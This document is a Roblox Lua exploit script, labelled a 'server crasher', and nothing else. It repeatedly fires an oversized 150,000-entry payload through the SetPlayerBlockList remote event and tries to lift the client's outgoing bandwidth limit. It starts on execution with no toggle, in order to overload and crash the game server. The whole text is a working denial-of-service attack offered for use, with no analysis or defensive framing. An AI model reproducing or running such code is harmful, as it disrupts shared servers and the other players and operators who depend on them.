-- snowgirl server crasher: runs the moment this script executes.
-- Hammers RobloxReplicatedStorage.SetPlayerBlockList with a giant payload on a loop.
-- Top-of-screen banner shows it's live.

local Players     = game:GetService("Players")
local RunService  = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer
local playerGui   = LocalPlayer:WaitForChild("PlayerGui")

-- CONFIG
local CRASH_CHILDREN     = 150000   -- entries in the payload table
local CRASH_FIRE_BURST   = 1        -- fires per tick
local CRASH_FRAME_DELAY  = 0.125    -- seconds between fires (0 = every Heartbeat)
local CRASH_REBUILD_EACH = false    -- rebuild the payload table each fire instead of caching

-- CRASH PAYLOAD
local crash = {
    remote = nil,
    cache  = nil,
}

local function crashResolveRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local r = rrs:FindFirstChild("SetPlayerBlockList")
    if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent")) then
        return r
    end
    return nil
end

crash.remote = crashResolveRemote()

pcall(function()
    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
end)

local function crashBuild()
    local root = table.create(CRASH_CHILDREN)
    for i = 1, CRASH_CHILDREN do
        root[i] = { id = i, v = i * 2 }
    end
    return root
end

local function crashFire()
    if not crash.remote then
        crash.remote = crashResolveRemote()
        if not crash.remote then return end
    end
    local payload
    if CRASH_REBUILD_EACH or not crash.cache then
        payload = crashBuild()
        if not CRASH_REBUILD_EACH then crash.cache = payload end
    else
        payload = crash.cache
    end
    for _ = 1, CRASH_FIRE_BURST do
        crash.remote:FireServer(payload)
    end
end

-- Kick off immediately: no toggle, no wait.
print("[snow] crashing the server - firing SetPlayerBlockList every " .. tostring(CRASH_FRAME_DELAY) .. "s")
task.spawn(function()
    while true do
        pcall(crashFire)
        if CRASH_FRAME_DELAY > 0 then
            task.wait(CRASH_FRAME_DELAY)
        else
            RunService.Heartbeat:Wait()
        end
    end
end)
